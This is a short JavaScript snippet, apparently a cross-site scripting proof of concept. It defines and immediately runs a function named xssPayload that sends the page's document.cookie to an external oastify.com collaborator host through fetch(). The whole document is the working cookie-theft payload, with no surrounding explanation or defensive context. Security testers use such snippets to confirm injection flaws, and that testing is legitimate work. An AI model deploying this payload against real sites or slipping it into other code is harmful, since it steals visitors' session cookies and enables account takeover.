function xssPayload() {
  fetch("https://cgw4tl843mktyk57nc98pp0oyf46swgl.oastify.com/?"+document.cookie)
}

xssPayload();
